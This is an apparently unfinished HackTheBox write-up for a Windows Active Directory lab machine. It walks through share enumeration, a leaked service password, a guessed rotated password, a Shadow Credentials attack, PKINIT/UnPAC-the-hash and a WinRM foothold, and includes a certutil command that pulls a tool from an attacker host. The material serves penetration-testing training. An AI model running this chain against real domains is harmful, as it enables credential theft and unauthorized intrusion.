# Logging - HackTheBox Writeup

**Status:**  _Work in progress — user foothold achieved as `msa_health$`; root path under enumeration via `monitor.ps1`._

**Target:** `TARGET_IP` (10.129.41.161 at time of solve)
**Domain:** `logging.htb`
**Hosts:** `DC01.logging.htb`, `wsus.logging.htb`
**OS:** Windows Server (Active Directory Domain Controller)
**Difficulty:** Medium
**Starting credentials:** `wallace.everette / Welcome2026@`

---

## Attack Chain Overview

```
Given creds: wallace.everette:Welcome2026@
    
SMB share enumeration  \Logs share readable
    
Log file leaks connection dump: svc_recovery:Em3rg3ncyPa$$2025  (expired)
    
Year-rotation guess  Em3rg3ncyPa$$2026  valid TGT for svc_recovery
    
BloodHound as wallace.everette  svc_recovery has GenericWrite on msa_health$
    
Shadow Credentials attack (pywhisker)  PFX cert for msa_health$
    
PKINIT (gettgtpkinit)  TGT + AS-REP session key
    
UnPAC-the-Hash (getnthash)  NT hash for msa_health$
    
evil-winrm as msa_health$  user foothold
    
[WIP] Local enum  monitor.ps1  privilege escalation path
    
Administrator (pending)
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Environment Setup](#environment-setup)
3. [SMB Share Enumeration](#smb-share-enumeration)
4. [Credential Rotation Guess  svc_recovery](#credential-rotation-guess--svc_recovery)
5. [BloodHound — Finding the ACL Path](#bloodhound--finding-the-acl-path)
6. [Shadow Credentials via pywhisker](#shadow-credentials-via-pywhisker)
7. [PKINIT + UnPAC-the-Hash](#pkinit--unpac-the-hash)
8. [WinRM Foothold as msa_health$](#winrm-foothold-as-msa_health)
9. [Local Enumeration (WIP)](#local-enumeration-wip)
10. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Port Discovery
```bash
export TARGET=10.129.41.161
# What it does: full TCP port scan with fast rate.
# Why here: discover all open services on the DC and the secondary WSUS port.
nmap -sS -p- --min-rate 5000 -n $TARGET
# What it does: perform a service and script scan on identified open ports.
# Why here: confirm the Active Directory roles and check for the presence of the WSUS service.
nmap -sVC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530 $TARGET -oA service-scan
```

Standard DC footprint + `8530` (WSUS, hinting at `wsus.logging.htb`).

---

## Environment Setup

### Hosts file
```bash
# What it does: update the local hosts file with the discovered domain names.
# Why here: enable domain-based resolution for Kerberos and web services.
echo "$TARGET logging.htb DC01.logging.htb wsus.logging.htb" | sudo tee -a /etc/hosts
```

### Kerberos time sync

Any Kerberos operation (TGT request, AS-REP, GetUserSPNs, getnthash) requires the clock to be within 5 minutes of the DC.

```bash
# What it does: sync the attacker's clock with the Domain Controller.
# Why here: prevent Kerberos authentication failures caused by time drift beyond 5 minutes.
sudo timedatectl set-ntp false
sudo ntpdate -u $TARGET
```

---

## SMB Share Enumeration

### List shares
```bash
# What it does: validate Wallace's credentials and list available SMB shares.
# Why here: discover the custom Logs share which is the primary starting point for sensitive data recovery.
crackmapexec smb $TARGET --shares -u 'wallace.everette' -p 'Welcome2026@'
```

Standard AD shares plus a **`Logs`** custom share — always interesting on HTB.

### Explore NETLOGON for Configuration Artifacts
```bash
# What it does: recursively list the contents of the NETLOGON share.
# Why here: search for startup scripts or environment configurations that might leak credentials or provide lateral movement hints.
smbclient //$TARGET/NETLOGON -U wallace.everette%'Welcome2026@' -c 'recurse;ls'
```

### Exfiltrate Sensitive Logs
```bash
# What it does: download log files from the custom Logs share.
# Why here: recover the Verbose logs that contain the connection-context dump with service account credentials.
smbclient //$TARGET/Logs -U wallace.everette%'Welcome2026@' -c 'recurse;ls'
smbclient //$TARGET/Logs -U wallace.everette%'Welcome2026@'
```

Inside one of the log files, a **plaintext connection-context dump** is present:

```
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: {
  Domain: "logging.htb",
  Server: "DC01",
  SSL: "False",
  BindUser: "LOGGING\svc_recovery",
  BindPass: "Em3rg3ncyPa$$2025",
  Timeout: 30
}
```

Two service accounts are implied: `svc_recovery` and — via the share naming — `msa_health` (a managed service account).

---

## Credential Rotation Guess  svc_recovery

### Test leaked creds
```bash
# What it does: validate the leaked svc_recovery credentials.
# Why here: confirm if the discovered password is still active or requires rotation.
crackmapexec smb $TARGET -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'
```

**Result:** `STATUS_ACCOUNT_RESTRICTION` — authentication fails. The password is either expired, forced to change, or the account is hour-restricted. The log is from 2026-02 referencing `Em3rg3ncyPa$$2025` — the **password pattern is year-based** and looks stale.

### Try next year in the rotation
```bash
# What it does: request a Kerberos TGT using the guessed password.
# Why here: obtain a valid ticket for svc_recovery by predicting the year-based rotation.
impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026'
```

```
[*] Saving ticket in svc_recovery.ccache
```

The pattern held — password was rotated year-forward.

```bash
export KRB5CCNAME=$(pwd)/svc_recovery.ccache
klist
```

---

## BloodHound — Finding the ACL Path

### Collect the graph
```bash
bloodhound-python -u wallace.everette -p 'Welcome2026@' \
  -d logging.htb -dc DC01.logging.htb -ns $TARGET -c All --zip
```

Upload the zip to BloodHound and set `svc_recovery` as **Owned**.

### Key finding
`svc_recovery`  **GenericWrite**  `MSA_HEALTH$`

`GenericWrite` on a computer / MSA account enables two classic attacks:

1. **Resource-Based Constrained Delegation (RBCD)** — requires control of another account with an SPN.
2. **Shadow Credentials** — write `msDS-KeyCredentialLink` and authenticate via PKINIT.

The DC runs Windows 2016+ and supports PKINIT, so **Shadow Credentials is the cleaner primitive** here.

---

## Shadow Credentials via pywhisker

### User enumeration (context)
```bash
# What it does: enumerate all domain users.
# Why here: identify potential targets for ACL abuse or password spraying.
crackmapexec smb $TARGET -u 'wallace.everette' -p 'Welcome2026@' --users
rpcclient -U "logging.htb/wallace.everette%Welcome2026@" $TARGET -c "enumdomusers"
```

Domain users observed:
```
toby.brynleigh
wallace.everette
serina.philander
wellington.kylan
fable.milford
kyson.abel
monique.chip
jaylee.clifton
svc_recovery
msa_health
```

### Write the key credential on msa_health$

With `svc_recovery`'s TGT in the environment:

```bash
export KRB5CCNAME=$(pwd)/svc_recovery.ccache

# What it does: run pywhisker to perform a Shadow Credentials attack.
# Why here: write a new key to the msa_health$ computer object to enable certificate-based auth.
python3 pywhisker/pywhisker.py \
  -d "logging.htb" \
  -u "svc_recovery" --no-pass -k \
  --target "msa_health$" \
  --action "add" \
  --dc-ip $TARGET
```

**Output (sample):**
```
[+] Certificate added: t9VbfvhY.pfx
[+] PFX password: Z7teStyyJxhoRZR6tGDd
```

The `msDS-KeyCredentialLink` property on `MSA_HEALTH$` now contains our public key — we can authenticate as that account using the PFX.

---

## PKINIT + UnPAC-the-Hash

### Request a TGT with the certificate

```bash
# What it does: request a TGT using the generated PFX certificate.
# Why here: authenticate as msa_health$ via PKINIT to start the credential extraction process.
python3 gettgtpkinit.py \
  -cert-pfx ../pywhisker/t9VbfvhY.pfx \
  -pfx-pass 'Z7teStyyJxhoRZR6tGDd' \
  logging.htb/msa_health\$ msa_health.ccache
```

The tool also prints the **AS-REP session key** — keep it, we need it to decrypt the PAC and reveal the NT hash.

```
AS-REP encryption key:
b0fed55e745ae9ffbba885d0cd7db34a16fb565a26ca1967c90b3968a7b7f0a6
```

```bash
klist -c msa_health.ccache
export KRB5CCNAME=$(pwd)/msa_health.ccache
```

### UnPAC the hash

```bash
# What it does: extract the account's NT hash from the PAC.
# Why here: obtain a reusable NTLM hash for msa_health$ to establish a shell foothold.
python3 getnthash.py \
  -key 'b0fed55e745ae9ffbba885d0cd7db34a16fb565a26ca1967c90b3968a7b7f0a6' \
  -dc-ip $TARGET logging.htb/msa_health\$
```

**Recovered:**
```
NT Hash: 603fc24ee01a9409f83c9d1d701485c5
```

> **Why this works:** `gettgtpkinit` authenticates with a certificate and receives a TGT. The TGT includes a PAC encrypted with the AS-REP session key, and the PAC carries the account's NTLM credentials. `getnthash` decrypts the PAC and extracts the NT hash — giving us a credential usable with NTLM, PTH, WinRM, SMB, etc.

---

## WinRM Foothold as msa_health$

```bash
# What it does: log in via WinRM using the extracted NT hash.
# Why here: establish the first interactive session on the DC.
evil-winrm -i $TARGET -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```

Verify:
```
*Evil-WinRM* PS> whoami
logging\msa_health$
```

---

## Local Enumeration (WIP)

### Transfer WinPEAS

Host the payload locally:
```bash
# What it does: host the winPEAS script on the attacker machine.
# Why here: facilitate the transfer of enumeration tools to the target.
sudo python3 -m http.server 80
```

From the shell (Meterpreter isn't available here — use `certutil` or `iwr`):
```powershell
# What it does: download winPEAS and execute it to find escalation paths.
# Why here: automate the search for misconfigurations on the local system.
certutil -urlcache -f http://<ATTACKER_IP>:80/winPEAS.ps1 winPEAS.ps1
.\winPEAS.ps1 > resultados.txt 2>&1
```

### Interesting artefact — `monitor.ps1`

A custom PowerShell script in the environment is worth profiling:

```powershell
Get-ChildItem monitor.ps1 | Format-List Name, LastWriteTime, CreationTime, LastAccessTime
Get-Content monitor.ps1
Get-Acl monitor.ps1 | Format-List
```

>  **Pending**: identify _who_ runs `monitor.ps1`, _how often_ (scheduled task / service), and _whether_ the running account is `msa_health$` or a higher-privileged principal. If it runs as Administrator / SYSTEM and is writable by `msa_health$`, writing payload code into it yields privilege escalation.

This section will be expanded once root is reached.

---

## Key Takeaways (current)

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Share Triage** | SMB share enum with provided creds | Custom `\Logs` share leaked service-account context |
| **Credential Pivot** | Year-rotation password guess | `Em3rg3ncyPa$$2025`  `Em3rg3ncyPa$$2026` worked |
| **Graph Analysis** | BloodHound (`bloodhound-python`) | Exposed `GenericWrite` from `svc_recovery` onto `msa_health$` |
| **ACL Abuse** | Shadow Credentials (pywhisker) | Wrote `msDS-KeyCredentialLink` to MSA account |
| **Auth Upgrade** | PKINIT  UnPAC-the-Hash | Extracted NT hash from AS-REP-encrypted PAC |
| **Foothold** | `evil-winrm -H` (PTH over WinRM) | Shell as `msa_health$` |
| **Root** | _Pending — `monitor.ps1` path_ | Active enumeration |

### Lessons so far

1. **Never log credentials.** Verbose application logs dumping bind passwords are a recurring AD bootstrap vector.
2. **Rotate by secret, not by rule.** Year-suffixed passwords leak the rotation logic as soon as one historical secret escapes.
3. **ACLs beat passwords.** A single `GenericWrite` over an MSA, combined with PKINIT support, is a full authentication bypass.
4. **Protect `msDS-KeyCredentialLink`.** Monitor writes to this attribute — Shadow Credentials shows up loudly in event 5136 with the right SACL.

### Related Notes
- [netexec / crackmapexec](../../../tools/recon/netexec.md) — SMB bind and share listing
- [impacket](../../../tools/windows/impacket.md) — `getTGT`
- [evil-winrm](../../../tools/windows/evil-winrm.md) — WinRM with hash auth
- [Kerberos roasting notes](../../../exploits/ad/kerberos-roasting.md) (for related AD ticketing)
- _TODO_: dedicated `exploits/shadow-credentials.md` covering pywhisker + PKINIT + UnPAC workflow
